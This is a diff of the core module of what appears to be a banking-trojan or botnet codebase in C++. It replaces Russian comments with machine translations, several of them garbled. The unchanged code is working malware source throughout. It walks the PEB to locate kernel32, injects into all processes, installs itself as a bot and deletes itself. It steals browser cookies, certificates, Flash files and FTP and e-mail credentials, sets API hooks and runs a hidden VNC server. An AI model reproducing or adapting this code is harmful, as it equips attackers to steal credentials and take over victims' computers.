@@ -53,22 +53,22 @@ COREDATA coreData;
 static ThreadsGroup::GROUP servcieThreads;
 extern const char baseConfigSource[sizeof(BASECONFIG)];
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Список процессов.
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//В List of processes.
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 typedef struct
 {
-  DWORD nameId;  //Имя процесса, может модержать маску если folder == CSIDL_DESKTOP.
-  DWORD rights; //Права CDPF_RIGHT_*.
-  DWORD folder; //Папка процесса CSIDL_. Если folder == CSIDL_DESKTOP, папка может быть любая.
+  DWORD nameId;  //The name of the process, can moderzhat mask if folder == CSIDL_DESKTOP.
+  DWORD rights; //Right CDPF_RIGHT_ *.
+  DWORD folder; //Folder process CSIDL_. If folder == CSIDL_DESKTOP, folder can be anything.
 }
 PROCESSRIGHTS;
 
-//!!! КОД для CSIDL_DESKTOP не активен!
+//! The code for CSIDL_DESKTOP not active!
 const static PROCESSRIGHTS processRights[] =
 {
-  //Процессы, которые присутвуют на протяжений все сессии пользователя.
+  //Processes, which is present during all sessions of the user.
   {CryptedStrings::id_core_pr_dwm,      Core::CDPF_RIGHT_CONTROL,                                                                                                        CSIDL_SYSTEM},
   {CryptedStrings::id_core_pr_taskhost, Core::CDPF_RIGHT_CONTROL | Core::CDPF_RIGHT_SERVER_SESSION | Core::CDPF_RIGHT_TCP_SERVER | Core::CDPF_RIGHT_BACKCONNECT_SESSION, CSIDL_SYSTEM},
   {CryptedStrings::id_core_pr_taskeng,  Core::CDPF_RIGHT_CONTROL | Core::CDPF_RIGHT_SERVER_SESSION | Core::CDPF_RIGHT_TCP_SERVER | Core::CDPF_RIGHT_BACKCONNECT_SESSION, CSIDL_SYSTEM},
@@ -78,12 +78,12 @@ const static PROCESSRIGHTS processRights[] =
   {CryptedStrings::id_core_pr_explorer, Core::CDPF_RIGHT_CONTROL | Core::CDPF_RIGHT_SERVER_SESSION | Core::CDPF_RIGHT_TCP_SERVER | Core::CDPF_RIGHT_BACKCONNECT_SESSION, CSIDL_WINDOWS},
 };
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Утилиты.
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//В Utilities.
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 #if(BO_DEBUG == 2)
-  static HANDLE debugServer; //Хэдл потока дебюга.
+  static HANDLE debugServer; //Hadley flow debyuga.
 
   /*
   Функция запуска дебюг-сервера.
@@ -182,7 +182,7 @@ HMODULE _getKernel32Handle(void)
     cld                    //clear the direction flag for the loop
     
     mov edx, fs:[0x30]     //get a pointer to the PEB
-    mov edx, [edx + 0x0C]  //get PEB->Ldr
+    mov edx, [edx + 0x0C]  //get PEB-> Ldr
     mov edx, [edx + 0x14]  //get the first module from the InMemoryOrder module list
   
   next_mod:
@@ -210,9 +210,9 @@ HMODULE _getKernel32Handle(void)
 #endif
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Core.
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//In the Core.
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
   Загрузка модулей и функций.
@@ -226,7 +226,7 @@ static bool __inline initLoadModules(DWORD flags)
 {
   if((coreData.modules.kernel32 = _getKernel32Handle()) == NULL)
   {
-    //WDEBUG0(WDDT_ERROR, "_getKernel32Handle() failed.");
+    //WDEBUG0 (WDDT_ERROR, "_getKernel32Handle () failed.");
     return false;
   }
 
@@ -236,13 +236,13 @@ static bool __inline initLoadModules(DWORD flags)
   }
   else
   {
-    //coreData.modules.current  - обновляется родетелем.
+    //coreData.modules.current - updated rodetelem.
 
-    //Обновление импорта.
+    //Update imports.
     if(!PeImage::_loadImport(coreData.modules.current, __GetProcAddress(coreData.modules.kernel32, "LoadLibraryA"), __GetProcAddress(coreData.modules.kernel32, "GetProcAddress")))return false;
   }
 
-  //Подгружаем ntdll.dll и нужные функции.
+  //Loads ntdll.dll and desired functions.
   {
     {
       CSTR_GETW(dllName, module_ntdll);
@@ -300,7 +300,7 @@ static bool __inline initOsBasic(DWORD flags)
   if((flags & Core::INITF_INJECT_START) == 0 && Process::_isWow64(CURRENT_PROCESS))coreData.proccessFlags |= Core::CDPF_WOW64;
 # endif
   
-  //Получем дескрипторы для доступа.
+  //Get a handle for access.
   if((coreData.securityAttributes.buf = WinSecurity::_getFullAccessDescriptors(&coreData.securityAttributes.saAllowAll, &coreData.securityAttributes.sdAllowAll)) == NULL)
   {
     WDEBUG0(WDDT_ERROR, "GetFullAccessDescriptors failed.");
@@ -314,10 +314,10 @@ static bool __inline initOsBasic(DWORD flags)
   }
   else
   {
-    //Сохраняется при копировании модуля.
+    //Preserved when you copy a module.
   }
 
-  //Версия Windows.
+  //Version of Windows.
   {
     coreData.winVersion = OsEnv::_getVersion();
     if(coreData.winVersion < OsEnv::VERSION_XP)
@@ -327,7 +327,7 @@ static bool __inline initOsBasic(DWORD flags)
     }
   }
   
-  //Получение IntegrityLevel.
+  //Getting IntegrityLevel.
   if((coreData.integrityLevel = Process::_getIntegrityLevel(CURRENT_PROCESS)) == Process::INTEGRITY_UNKNOWN)
   {
     if(coreData.winVersion < OsEnv::VERSION_VISTA)coreData.integrityLevel = Process::INTEGRITY_MEDIUM;
@@ -356,7 +356,7 @@ static bool __inline initOsBasic(DWORD flags)
 */
 static bool __inline initHandles(DWORD flags)
 {
-  //Глобальные объекты.
+  //Global objects.
   if((flags & Core::INITF_INJECT_START) == 0)
   {
     coreData.globalHandles.stopEvent   = CWA(kernel32, CreateEventW)(&coreData.securityAttributes.saAllowAll, TRUE, FALSE, NULL);
@@ -370,14 +370,14 @@ static bool __inline initHandles(DWORD flags)
   }
   else
   {
-    //Создается родиьельским потоком.
+    //Created rodielskim flow.
   }
   
   return true;
 }
 
 /*
-  Данные текщего юзера.
+  These tekschego user.
 
   IN flags - флаги INITF_*.
 
@@ -413,7 +413,7 @@ static bool __inline initPaths(DWORD flags)
 {
   WCHAR path[MAX_PATH];
 
-  //Получаем домашнию директорию.
+  //Obtain the home directory.
   if((flags & Core::INITF_INJECT_START) == 0)
   {
     if(CWA(shell32, SHGetFolderPathW)(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, coreData.paths.home) != S_OK)
@@ -425,10 +425,10 @@ static bool __inline initPaths(DWORD flags)
   }
   else
   {
-    //Сохраняется от родителя.
+    //It is saved from a parent.
   }
 
-  //Текущий файл.
+  //Current file.
   DWORD size = CWA(kernel32, GetModuleFileNameW)(NULL, path, MAX_PATH);
   if((coreData.paths.process = Str::_CopyExW(path, size)) == NULL)
   {
@@ -459,7 +459,7 @@ static bool __inline initBaseConfig(DWORD flags)
 }
 
 /*
-  Создание имен объектов.
+  Creation of object names.
 
   IN flags - флаги INITF_*.
 
@@ -472,12 +472,12 @@ static bool __inline initObjects(DWORD flags)
   if((flags & Core::INITF_INJECT_START) == 0)
   {
     BASECONFIG bs;
-    Core::getBaseConfig(&bs); //!!! Первичный вызов PeCrypt::_decryptSection().
+    Core::getBaseConfig(&bs); //! The primary challenge PeCrypt:: _decryptSection ().
     MalwareTools::_generateKernelObjectName(&coreData.osGuid, Core::OBJECT_ID_BOT_STATUS, coreData.currentUser.id, coreData.installId, &bs.baseKey, MalwareTools::KON_DEFAULT);
   }
   else
   {
-    //Сохраняется при копировании модуля.
+    //Preserved when you copy a module.
   }
   return true;
 }
@@ -537,7 +537,7 @@ static bool __inline initProcessRights(DWORD flags)
 }
 
 /*
-  Установка хуков.
+  Install hooks.
 
   IN flags - флаги INITF_*.
 
@@ -556,7 +556,7 @@ static bool __inline initHooks(DWORD flags)
     {
       HttpGrabber::init();
 
-      //Узнаем принудитильную домашнию страницу.
+      //Learn prinuditilnuyu homepage.
       WCHAR homePage[max(MAX_PATH, 0xFF + 1)];
       Core::getPeSettingsPath(Core::PSP_QUICKSETTINGSFILE, homePage);
       DWORD homePageSize = Fs::_readFileToBuffer(homePage, homePage, 0xFF * sizeof(WCHAR));
@@ -583,7 +583,7 @@ static bool __inline initHooks(DWORD flags)
     VncServer::init();
 #   endif
 
-    //Выставляем хуки.
+    //Expose the hooks.
 #   if(BO_NSPR4 > 0)
     if(WinApiTables::_trySetNspr4Hooks())
     {
@@ -597,24 +597,24 @@ static bool __inline initHooks(DWORD flags)
   return true;
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 bool Core::init(DWORD flags)
 {
   if((flags & INITF_INJECT_START) == 0)coreData.proccessFlags = 0;
-  //else coreData.proccessFlags = 0; //обновляется родетелем.
+  //else coreData.proccessFlags = 0, / / вЂ‹вЂ‹updated rodetelem.
 
-  //Получаем хэндлы основных модулей (dll).
+  //Obtain the handles of the main modules (dll).
   if(!initLoadModules(flags))return false;
 
-  //Инициализируем основные модули.
+  //Initialize the basic modules.
   Mem::init(512 * 1024);
   Crypt::init();
   CoreHook::init();
   CoreHook::disableFileHookerForCurrentThread(true);
   WSocket::init();
   
-  //Подготовка к выводу отладочной информации.
+  //Preparing to debug output.
 # if(BO_DEBUG > 0)
   {
     DebugClient::Init();
@@ -628,43 +628,43 @@ bool Core::init(DWORD flags)
   }
 # endif
 
-  //Основные данные OC.
+  //Basic data OC.
   if(!initOsBasic(flags))return false;
 
-  //Объекты.
+  //Objects.
   if(!initHandles(flags))return false;
 
-  //Данные текщего юзера.
+  //These tekschego user.
   if(!initUserData(flags))return false;
 
-  //Получаем домашнию директорию.
+  //Obtain the home directory.
   if(!initPaths(flags))return false;
   
   //PID
   coreData.pid = CWA(kernel32, GetCurrentProcessId)();
 
-  //Обнуляем UserAgent.
+  //Zeroing UserAgent.
   coreData.httpUserAgent = NULL;
   
   if(!initBaseConfig(flags))return false;
   
-  //Создание имен объектов.
+  //Creation of object names.
   if(!initObjects(flags))return false;
 
-  //Устанавливаем права процесса.
+  //Set the right process.
   if(!initProcessRights(flags))return false;
 
-  //Инициализируем дополнительные модули.
+  //Initialize additional modules.
   MsCab::Init();
   Report::init();
   DynamicConfig::init();
   LocalConfig::init();
   LocalSettings::init();
 
-  //Установка хуков.
+  //Install hooks.
   if(!initHooks(flags))return false;
 
-  //Выводим информацию о процессе.
+  //Deduce information about the process.
 # if(BO_DEBUG > 0)
   {
     LPWSTR userSid;
@@ -701,7 +701,7 @@ void Core::uninit(void)
     CWA(kerne32, CloseHandle)(debugServer);
   }
 #endif
-  //...Заполнить, когда понадобится, а так нет смысла тратить код.
+  //... Fill in when needed, and there is no point in wasting code.
 }
 
 void Core::initHttpUserAgent(void)
@@ -764,7 +764,7 @@ void *Core::initNewModule(HANDLE process, HANDLE processMutex, DWORD proccessFla
 
   BYTE errorsCount = 0;
   
-  //Дублируем мютекс нового процесса в новый процесс.
+  //Duplicate myuteks new process in the new process.
   {
     HANDLE newMutex;
     if(CWA(kernel32, DuplicateHandle)(CURRENT_PROCESS, processMutex, process, &newMutex, 0, FALSE, DUPLICATE_SAME_ACCESS) == FALSE)
@@ -782,7 +782,7 @@ void *Core::initNewModule(HANDLE process, HANDLE processMutex, DWORD proccessFla
     errorsCount++;
   }
 
-  //Указываем текущий модуль.
+  //Indicates current module.
   if(!copyDataToProcess(process, image, &coreData.modules.current, &image, sizeof(HMODULE)))
   {
     WDEBUG0(WDDT_ERROR, "Failed coreData.modules.current.");
@@ -803,14 +803,14 @@ void *Core::initNewModule(HANDLE process, HANDLE processMutex, DWORD proccessFla
     errorsCount++;
   }
 
-  //Выход с ошибкой.
+  //Exits with an error.
   if(errorsCount != 0)
   {
     CWA(kernel32, VirtualFreeEx)(process, image, 0, MEM_RELEASE);
     return NULL;
   }
   
-  //Успешеный ввыход.
+  //Uspesheny vvyhod.
   return image;
 }
 
@@ -843,7 +843,7 @@ void Core::_destroyFunction(void *p)
   for(;;)
   {
     size = Disasm::_getOpcodeLength(cur);
-    if(size == (DWORD)(-1) || *cur == 0xC3 || *cur == 0xC2 || *cur == 0xCB || *cur == 0xCA)break; //Все виды ret для x32, x64
+    if(size == (DWORD)(-1) || *cur == 0xC3 || *cur == 0xC2 || *cur == 0xCB || *cur == 0xCA)break; //All kinds of ret for x32, x64
     Crypt::_generateBinaryData(cur, size, 0, 0xFF, false);
     cur += size;  
   }
@@ -855,11 +855,11 @@ void Core::_generateBotId(LPWSTR buf)
   WCHAR cid[40];
   DWORD subId[2];
 
-  //Получаем NetBIOS.
+  //Obtain NetBIOS.
   int size = sizeof(cid) / sizeof(WCHAR);
   if(CWA(kernel32, GetComputerNameW)(cid, (LPDWORD)&size) == FALSE)CryptedStrings::_getW(CryptedStrings::id_core_botid_unknown, cid);
 
-  //Получаем версию. Здесь мощная параноя по поводу Mem::_zero().
+  //Obtain version. Here, a strong paranoia about the Mem:: _zero ().
   OSVERSIONINFOEXW ovi;
   Mem::_zero(&ovi, sizeof(OSVERSIONINFOEXW));
   ovi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
@@ -869,20 +869,20 @@ void Core::_generateBotId(LPWSTR buf)
   {
     CSTR_GETW(regKey, core_botid_regkey);
 
-    //Дата установки.
+    //Date of installation.
     {
       CSTR_GETW(regValue1, core_botid_regvalue_1);
       subId[0] = Registry::_getValueAsDword(HKEY_LOCAL_MACHINE, regKey, regValue1);
     }
 
-    //Данные о регистрации.
+    //Registration data.
     {
       CSTR_GETW(regValue2, core_botid_regvalue_2);
       subId[1] = Registry::_getsCrc32OfValue(HKEY_LOCAL_MACHINE, regKey, regValue2);
     }
   }
 
-  //Создаем полный ID
+  //Create a full ID
   {
     CSTR_GETW(format, core_botid_format);
     size = Str::_sprintfW(buf, 60, format, cid, Crypt::crc32Hash((LPBYTE)&ovi, sizeof(OSVERSIONINFOEXW)), Crypt::crc32Hash((LPBYTE)subId, sizeof(subId)));
@@ -917,7 +917,7 @@ void Core::getPeSettingsPath(DWORD type, LPWSTR path)
   PESETTINGS pe;
   getPeSettings(&pe);
 
-  //Получаем исходные данные.
+  //Obtain baseline data.
   LPSTR source;
   LPWSTR prefix;
   switch(type)
@@ -941,7 +941,7 @@ void Core::getPeSettingsPath(DWORD type, LPWSTR path)
     default: return;
   }
 
-  //Собираем путь.
+  //Putting the path.
   if(Str::_ansiToUnicode(source, -1, buf, sizeof(buf) / sizeof(WCHAR)) != 0)
   {
     if(!Fs::_pathCombine(path, prefix, buf))*path = 0;
@@ -994,16 +994,16 @@ void Core::getCurrentBotnetName(LPWSTR name)
 
 void *Core::getBaseOverlay(const void *mem, LPDWORD size)
 {  
-  //Создаем ключ.
+  //Create the key.
   Crypt::RC4KEY key;
   Crypt::_rc4Init(baseConfigSource, sizeof(BASECONFIG), &key);
   
-  //Ищим адрес.
+  //Ischim address.
   void *overlay = BaseOverlay::_getAddress(mem, *size, &key);
   BYTE buffer[BaseOverlay::FULL_SIZE_OF_OVERLAY];
   *size = BaseOverlay::FULL_SIZE_OF_OVERLAY;
 
-  //Загружаем.
+  //Load.
   if(overlay != NULL && BaseOverlay::_loadOverlay(buffer, overlay, size, &key))return Mem::copyEx(buffer, *size);
 
   return NULL;
@@ -1011,14 +1011,14 @@ void *Core::getBaseOverlay(const void *mem, LPDWORD size)
 
 bool Core::setBaseOverlay(void *mem, DWORD size, const void *data, DWORD dataSize)
 {
-  //Создаем ключ.
+  //Create the key.
   Crypt::RC4KEY key;
   Crypt::_rc4Init(baseConfigSource, sizeof(BASECONFIG), &key);
 
-  //Ищим адрес.
+  //Ischim address.
   void *overlay = BaseOverlay::_getAddress(mem, size, &key);
 
-  //Сохраняем.
+  //Save.
   return (overlay != NULL && BaseOverlay::_createOverlay(overlay, data, dataSize, &key));
 }
 
@@ -1059,7 +1059,7 @@ static void destoyUserNow(void)
 
 bool Core::destroyUser(void)
 {
-  //FIXME: Читать, подумать.
+  //FIXME: read, think about it.
   
   LocalSettings::SETTINGS settings;
   
@@ -1078,14 +1078,14 @@ bool Core::destroyUser(void)
 
 bool Core::showInfoBox(BYTE type)
 {
-  //Получаем DLL.
+  //Obtain the DLL.
   HMODULE userDll;
   {
     CSTR_GETW(userDllName, module_user32);
     if((userDll = CWA(kernel32, GetModuleHandleW)(userDllName)) == NULL)return false;
   }
 
-  //Получаем MessageBoxW.
+  //Obtain MessageBoxW.
   typedef int (WINAPI *MESSAGEBOX)(HWND window, LPCWSTR text, LPCWSTR caption, UINT type);
   MESSAGEBOX messageBox;
   {
@@ -1116,21 +1116,21 @@ bool Core::showInfoBox(BYTE type)
   return true;  
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Точки входа.
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//В Entry point.
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 static bool defaultModuleEntry(void)
 {
   if(Core::init(Core::INITF_INJECT_START | Core::INITF_HOOKS_FOR_USER))
   {
     Core::createServices(false);
-    //? ThreadsGroup::_closeGroup(&servcieThreads);
+    //? ThreadsGroup:: _closeGroup (& servcieThreads);
     
     LocalSettings::SETTINGS ls;
     if(coreData.integrityLevel > Process::INTEGRITY_LOW && LocalSettings::beginReadWrite(&ls))
     {
-      //Получение кукисов браузеров.
+      //Getting browser cookies.
       if((ls.processStartupFlags & LocalSettings::PSF_COOKIES_GRABBED) == 0)
       {
 #       if(BO_WININET > 0)
@@ -1144,7 +1144,7 @@ static bool defaultModuleEntry(void)
         ls.processStartupFlags |= LocalSettings::PSF_COOKIES_GRABBED;
       }
       
-      //Получение сертификатов.
+      //Obtaining certificates.
       if((ls.processStartupFlags & LocalSettings::PSF_CERTSTORE_GRABBED) == 0)
       {
         CertStoreHook::_exportMy();
@@ -1156,14 +1156,14 @@ static bool defaultModuleEntry(void)
         ls.processStartupFlags |= LocalSettings::PSF_CERTSTORE_GRABBED;
       }
 
-      //Получение MFP.
+      //Getting the MFP.
       if(ls.processStartupFlags & LocalSettings::PSF_MFP_GRAB)
       {
         SoftwareGrabber::_getMacromediaFlashFiles();
         ls.processStartupFlags &= ~LocalSettings::PSF_MFP_GRAB;
       }
 
-      //Удаление MFP.
+      //Removal of MFP.
       if(ls.processStartupFlags & LocalSettings::PSF_MFP_REMOVE)
       {
         SoftwareGrabber::_removeMacromediaFlashFiles();
@@ -1182,7 +1182,7 @@ static bool defaultModuleEntry(void)
          ) &&
          ComLibrary::_initThread(&comResult))
       {
-        //FTP-клиенты.
+        //FTP-clients.
 #       if(BO_SOFTWARE_FTP > 0)    
         if((ls.processStartupFlags & LocalSettings::PSF_SOFTWARE_FTP_GRABBED) == 0)
         {
@@ -1191,7 +1191,7 @@ static bool defaultModuleEntry(void)
         }
 #       endif
 
-        //E-mail-клиенты.
+        //E-mail-clients.
 #       if(BO_SOFTWARE_EMAIL > 0)    
         if((ls.processStartupFlags & LocalSettings::PSF_SOFTWARE_EMAIL_GRABBED) == 0)
         {
@@ -1215,7 +1215,7 @@ int WINAPI Core::_injectEntryForModuleEntry(void)
 {
   if(defaultModuleEntry())
   {
-    //Вычисляем точку входа. Осознанно не проверяю читатаемость указателей.
+    //Compute the entry point. Deliberately did not check chitataemost pointers.
     HANDLE mainModule = CWA(kernel32, GetModuleHandleW)(NULL);
     if(((PIMAGE_DOS_HEADER)mainModule)->e_magic == IMAGE_DOS_SIGNATURE)
     {
@@ -1238,16 +1238,14 @@ DWORD WINAPI Core::_injectEntryForThreadEntry(void *)
   return 0;
 }
 
-/*
-  Запуск процесса как бота, в зависимости от оврелея либо в режиме инсталятора, либо в режиме
-  загрузки.
+/*В В Starting the process as a bot, depending on ovreleya in either installer or mode
+В В loading.
 
-  IN forceUpdate  - форсировать обновление не зависмо от версии (только для инсталятора).
-  IN removeItself - самоудалние после завершения процесса (только для инсталятора).
+В В IN forceUpdate - to force the update does not zavismo on the version (only installer).
+В В IN removeItself - samoudalnie after completion of the process (only installer).
 
-  Return          - true - в случаи успеха,
-                    false - в случаи ошибки.
-*/
+В В Return - true - if successful,
+В В В В В В В В В В В В В В В В В В В В false - if an error occurs.*/
 static bool runAsBot(bool forceUpdate, bool removeItself)
 {
   bool ok = false;
@@ -1256,19 +1254,19 @@ static bool runAsBot(bool forceUpdate, bool removeItself)
   WCHAR strObject[50];
   HANDLE mutex;
 
-  //Получаем оверлей.
+  //Obtain the overlay.
   {
     Fs::MEMFILE mf;
     if(Fs::_fileToMem(coreData.paths.process, &mf, 0))
     {
-      //Преднамерено не проверяем на ошибки.
+      //Intentionally do not check for errors.
       overlaySize = mf.size;
       if((overlay = Core::getBaseOverlay(mf.data, &overlaySize)) == NULL)overlaySize = 0;
       Fs::_closeMemFile(&mf);
     }
   }
 
-  //Запуск в режиме лоадера. (Повторный запуск лодаера для пользователя безопасен).
+  //Starting in the mode of the loader. (Restarting lodaera user safe).
   if(overlaySize == sizeof(PESETTINGS))
   {
     WDEBUG0(WDDT_INFO, "I'm a loader.");
@@ -1277,7 +1275,7 @@ static bool runAsBot(bool forceUpdate, bool removeItself)
       generateObjectName(Core::OBJECT_ID_LOADER, strObject, MalwareTools::KON_SESSION);
       if((mutex = Sync::_createUniqueMutex(&coreData.securityAttributes.saAllowAll, strObject)) != NULL)
       {
-        //FIXME: Проверяем LocalSettings::PSF_USER_DISABLED.
+        //FIXME: Check LocalSettings:: PSF_USER_DISABLED.
         {
           LocalSettings::SETTINGS settings;
           LocalSettings::getCurrent(&settings);
@@ -1289,13 +1287,13 @@ static bool runAsBot(bool forceUpdate, bool removeItself)
           }
         }
 
-        //Инжектимся.
+        //Inject.
         CoreInject::_injectToAll();
 
-        //FIXME: Так надежнее.
+        //FIXME: It is more reliable.
         if(coreData.proccessFlags & Core::CDPF_DISABLE_CREATEPROCESS)destoyUserNow();
         
-        //Сообщаем родителю, что лоадер закончил свою работу.
+        //Inform parents that the loader has finished its work.
         {
           generateObjectName(Core::OBJECT_ID_LOADER_READY, strObject, MalwareTools::KON_SESSION);
           HANDLE event = CWA(kernel32, OpenEventW)(EVENT_MODIFY_STATE, FALSE, strObject);
@@ -1306,10 +1304,10 @@ static bool runAsBot(bool forceUpdate, bool removeItself)
           } 
         }
 
-        //Создаем сервисы.
+        //Create projects.
         Core::createServices(true);
 
-        //Выход.
+        //Exit.
         ok = true;
         CWA(kernel32, CloseHandle)(mutex);          
       }
@@ -1318,15 +1316,15 @@ static bool runAsBot(bool forceUpdate, bool removeItself)
 #     endif
     }
   }
-  //Запуск в режиме инсталлятора.
+  //Starting in the mode of the installer.
   else if(overlaySize == sizeof(INSTALLDATA))
   {
     WDEBUG0(WDDT_INFO, "I'm a installer.");
 
-    //Так мы даем всем инсталятором запушеным одновременно, проверить свои возможности поочереди.
+    //So we give all the installer fuzzy at the same time, check out its capabilities by turns.
     if((mutex = waitForMutexOfObject(Core::OBJECT_ID_INSTALLER, MalwareTools::KON_GLOBAL)) != NULL)
     {
-      //Даем время для инжекта бота в этот процесс.
+      //Give time for the injection produce a bot in this process.
       generateObjectName(Core::OBJECT_ID_CONTROL_INFECTION, strObject, MalwareTools::KON_SESSION);
       if(Sync::_mutexExists(strObject))
       {
@@ -1335,14 +1333,14 @@ static bool runAsBot(bool forceUpdate, bool removeItself)
         WDEBUG0(WDDT_INFO, "Process infection ready.");
       }
 
-      //Запуск из сервиса.
+      //Running out of service.
       if(CWA(advapi32, IsWellKnownSid)(coreData.currentUser.token->User.Sid, WinLocalSystemSid) == TRUE)
       {
         WDEBUG0(WDDT_INFO, "Current process started from system account. Installing to all users.");
         ok = CoreInstall::_installToAll();
         WDEBUG0(WDDT_INFO, "Installation ready.");
       }
-      //Нормальный запуск.
+      //Normal start.
       else
       {
         WCHAR coreFile[MAX_PATH];
@@ -1350,7 +1348,7 @@ static bool runAsBot(bool forceUpdate, bool removeItself)
         {
           INSTALLDATA *installData = (INSTALLDATA *)overlay;
 
-          //Проверка на обновление.
+          //Check for updates.
           BotStatus::VER1 *bs;
           if(WaHook::_isHooked(CURRENT_PROCESS, CWA(kernel32, GetFileAttributesExW)) && CWA(kernel32, GetFileAttributesExW)(coreData.installId, (GET_FILEEX_INFO_LEVELS)Core::OBJECT_ID_BOT_STATUS_SECRET, &bs) == TRUE)
           {
@@ -1358,7 +1356,7 @@ static bool runAsBot(bool forceUpdate, bool removeItself)
             ok = CoreInstall::_update(bs, coreData.paths.home, coreFile, forceUpdate);
             CWA(kernel32, VirtualFree)(bs, 0, MEM_RELEASE);
           }
-          //Нормальная установка.
+          //Normal setting.
           else
           {
             BaseOverlay::_decryptFunction((LPBYTE)CoreInstall::_install, installData->installSize, installData->xorKey);
@@ -1366,25 +1364,25 @@ static bool runAsBot(bool forceUpdate, bool removeItself)
           }
         }
 
-        //Запускаем установленный/обналвенный файл.
+        //Run the set / obnalvenny file.
         if(ok == true)
         {
           PROCESS_INFORMATION pi;
           if((ok = Process::_createEx(coreFile, NULL, coreData.paths.home, NULL, &pi) == 0 ? false : true))
           {
-            //Создаем сигнал.
+            //Create a signal.
             HANDLE events[2];
             generateObjectName(Core::OBJECT_ID_LOADER_READY, strObject, MalwareTools::KON_SESSION);
             events[0] = CWA(kernel32, CreateEventW)(&coreData.securityAttributes.saAllowAll, TRUE, FALSE, strObject);
             events[1] = pi.hProcess;
 
-            //Ждем упешной загрузки лоадера.
+            //Waiting upeshnoy boot loader.
             WDEBUG0(WDDT_INFO, "Waiting for loading of loader.");
             if(events[0] == NULL)CWA(kernel32, WaitForSingleObject)(pi.hProcess, INFINITE);
             else CWA(kernel32, WaitForMultipleObjects)(sizeof(events) / sizeof(HANDLE), events, FALSE, INFINITE);
             WDEBUG0(WDDT_INFO, "Process of loader is fininshed.");
 
-            //Закрываем хэндлы.
+            //Close the handles.
             if(events[0] != NULL)CWA(kernel32, CloseHandle)(events[0]);
             CWA(kernel32, CloseHandle)(pi.hThread);
             CWA(kernel32, CloseHandle)(pi.hProcess);
@@ -1392,14 +1390,14 @@ static bool runAsBot(bool forceUpdate, bool removeItself)
         }
       }
 
-      //Конец.
+      //End.
       Sync::_freeMutex(mutex);
     }
 #   if(BO_DEBUG > 0)
     else WDEBUG0(WDDT_ERROR, "Unknown error.");
 #   endif
 
-    //Удаляем себя.
+    //Remove yourself.
     if(removeItself == true)Process::_runBatchForRemoveFile(coreData.paths.process);
   }
 
@@ -1413,7 +1411,7 @@ void WINAPI Core::_entryPoint(void)
 
   if(init(INITF_NORMAL_START))
   {
-   //if(*((void **)_AddressOfReturnAddress() + 1) != NULL)Core::showInfoBox(Core::SIB_CRYPT_PROTECTION);
+   //if (* ((void **) _AddressOfReturnAddress () + 1)! = NULL) Core:: showInfoBox (Core:: SIB_CRYPT_PROTECTION);
 
     bool forceUpdate  = false;
     bool removeItself = true;
@@ -1426,7 +1424,7 @@ void WINAPI Core::_entryPoint(void)
     Core::disableErrorMessages();
 #   endif
     
-    //Анализиируем командную строку.
+    //Analiziiruem command line.
     {
       int argsCount;
       LPWSTR *args = CWA(shell32, CommandLineToArgvW)(CWA(kernel32, GetCommandLineW)(), &argsCount);
@@ -1435,14 +1433,14 @@ void WINAPI Core::_entryPoint(void)
       {
         for(int i = 0; i < argsCount; i++)if(args[i] != NULL && args[i][0] == '-')switch(args[i][1])
         {
-          //Вывод информации.
+          //Output information.
           case 'i': isInfo = true; break;
-          //Не удалять себя,.
+          //Do not delete yourself.
           case 'n': removeItself = false; break;
-          //Форсировать обновление.
+          //Force update.
           case 'f': forceUpdate = true; break;
 #         if(BO_VNC > 0)          
-          //VNC-процесс для прорисовки окон через PrintWindow.
+          //VNC-process for placing windows across PrintWindow.
           case 'v': isVnc = true; break;
 #         endif
         }
@@ -1450,7 +1448,7 @@ void WINAPI Core::_entryPoint(void)
       }
     }
     
-    //Выбор режима запуска.
+    //Selecting the startup mode.
     if(isInfo)
     {
       ok = Core::showInfoBox(Core::SIB_BOT_INFO);
@@ -1458,7 +1456,7 @@ void WINAPI Core::_entryPoint(void)
 #   if(BO_VNC > 0)          
     else if(isVnc)
     {
-      //init() вызывается тут, т.к. она не вызывается при INITF_NORMAL_START.
+      //init () is called here, because it is not called when INITF_NORMAL_START.
       VncServer::init();
       ok = VncServer::startAsPaintThread();
       VncServer::uninit();
